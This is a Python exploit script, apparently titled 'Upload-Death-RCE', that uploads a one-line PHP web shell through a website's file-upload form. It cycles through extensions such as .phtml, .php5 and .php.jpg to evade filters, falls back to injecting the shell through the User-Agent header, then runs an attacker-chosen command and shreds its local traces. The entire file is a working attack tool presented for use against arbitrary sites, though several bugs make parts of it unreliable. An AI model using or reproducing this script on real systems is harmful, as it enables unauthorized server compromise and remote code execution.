#!/usr/bin/python3
"""
   This exploit, exploits almost every website with an uploads directory
       (it's really more of a general purpose bypass)
           this will try multiple different ways to upload a PHP
               payload to the webserver and chain it to get remote code execution
                   exploit made by: fancy
"""
import requests
import os

red = '\033[38;2;255;0;0m\033m'
end = '\033[m'

payload = "<?php system($_GET['cmd']); ?>"


class ChainedRemoteCodeExec(object):
    def __init__(self, command, url, param_that_accepts_files, directory_with_file):
        self.url = url
        self.command = command
        self.param_that_accepts_files = param_that_accepts_files
        self.directory_with_file = directory_with_file

    def upload(self):
        file = {self.param_that_accepts_files: open('sendall.php', 'rb')}
        response = requests.post(self.url, files=file, allow_redirect=True)
        test_if_success = requests.get(self.url + f"/{self.directory_with_file}/" + "sendall.php")
        try:
            if test_if_success.status_code == 200:
                remote_code_exec = requests.get(self.directory_with_file + f"/sendall.php?cmd={self.command}")
                print(
                    f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                os.system("shred -zfvu sendall.php")
            else:
                os.system("mv sendall.php sendall.phtml")
                file = {self.param_that_accepts_files: open('sendall.phtml', 'rb')}
                response = requests.post(self.url, files=file, allow_redirect=True)
                test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.phtml")
                if test_if_success.status_code == 200:
                    remote_code_exec = requests.get(self.directory_with_file + f"/sendall.phtml?cmd={self.command}")
                    print(
                        f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                    os.system("shred -zfvu sendall.phtml")
                else:
                    os.system("mv sendall.php sendall.php3")
                    file = {self.param_that_accepts_files: open('sendall.php3', 'rb')}
                    response = requests.post(self.url, files=file, allow_redirect=True)
                    test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.php3")
                    if test_if_success.status_code == 200:
                        remote_code_exec = requests.get(self.directory_with_file + f"/sendall.php3?cmd={self.command}")
                        print(
                            f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                        os.system("shred -zfvu sendall.php3")
                    else:
                        os.system("mv sendall.php3 sendall.php4")
                        file = {self.param_that_accepts_files: open('sendall.php4', 'rb')}
                        response = requests.post(self.url, files=file, allow_redirect=True)
                        test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.php4")
                        if test_if_success.status_code == 200:
                            remote_code_exec = requests.get(
                                self.directory_with_file + f"/sendall.php4?cmd={self.command}")
                            print(
                                f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                            os.system("shred -zfvu sendall.php4")
                        else:
                            os.system("mv sendall.php4 sendall.php5")
                            file = {self.param_that_accepts_files: open('sendall.php5', 'rb')}
                            response = requests.post(self.url, files=file, allow_redirect=True)
                            test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.php5")
                            if test_if_success.status_code == 200:
                                remote_code_exec = requests.get(
                                    self.directory_with_file + f"/sendall.php5?cmd={self.command}")
                                print(
                                    f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                                os.system("shred -zfvu sendall.php5")
                            else:
                                os.system("mv sendall.php5 sendall.inc")
                                file = {self.param_that_accepts_files: open('sendall.inc', 'rb')}
                                response = requests.post(self.url, files=file, allow_redirect=True)
                                test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.inc")
                                if test_if_success.status_code == 200:
                                    remote_code_exec = requests.get(
                                        self.directory_with_file + f"/sendall.inc?cmd={self.command}")
                                    print(
                                        f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                                    os.system("shred -zfvu sendall.inc")
                                else:
                                    os.system("mv sendall.inc sendall.php.jpg")
                                    file = {self.param_that_accepts_files: open('sendall.php.jpg', 'rb')}
                                    response = requests.post(self.url, files=file, allow_redirect=True)
                                    test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.php.jpg")
                                    if test_if_success.status_code == 200:
                                        remote_code_exec = requests.get(
                                            self.directory_with_file + f"/sendall.php.jpg?cmd={self.command}")
                                        print(
                                            f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                                        os.system("shred -zfvu sendall.php.jpg")
                                    else:
                                        os.system("mv sendall.php.jpg sendall.PHp")
                                        file = {self.param_that_accepts_files: open('sendall.PHp', 'rb')}
                                        response = requests.post(self.url, files=file, allow_redirect=True)
                                        test_if_success = requests.get(f"{self.directory_with_file}/" + "sendall.PHp")
                                        if test_if_success.status_code == 200:
                                            remote_code_exec = requests.get(
                                                self.directory_with_file + f"/sendall.PHp?cmd={self.command}")
                                            print(
                                                f"{red}SUCCESS RETURNED {response}: {end}" + remote_code_exec.text + f"{red}\nREMOVING PAYLOAD{end}")
                                            os.system("shred -zfvu sendall.PHp")
                                        else:
                                            try:
                                                user_agent = {'User-Agent': "<?php system(\$_GET['cmd']);?>"}
                                                response = requests.get(self.url, headers=user_agent)
                                                if response == 200:
                                                    print(f"{red}[Uploaded The File Via User-Agent]")
                                                else:
                                                    os.system(
                                                        f""" curl '{self.url}' -H 'User-Agent: <?php system(\$_GET['cmd']);?>' """)
                                            except requests.exceptions.RequestException as err:
                                                exit(err)

        except (requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
                requests.exceptions.HTTPError, requests.exceptions.TooManyRedirects
                ) as requests_error:
            print(f"\n{requests_error}")


if __name__ == '__main__':
    os.system(f"echo '{payload}' > sendall.php")
    code_execution = ChainedRemoteCodeExec(
        url=input(
            f"{red}(Upload-Death-RCE){end} [Enter Complete URL With Uploads Section]:~#"),
        param_that_accepts_files=input(
            f"{red}(Upload-Death-RCE){end} [Enter HTML Parameter That Accepts Files]:~#"),
        command=input(f"{red}(Upload-Death-RCE){end} [Enter Command]:~#"),
        directory_with_file=input(f"{red}(Upload-Death-RCE){end} [Where Do Files Get Uploaded To? (FULL URL)]:~#"))
    code_execution.upload()
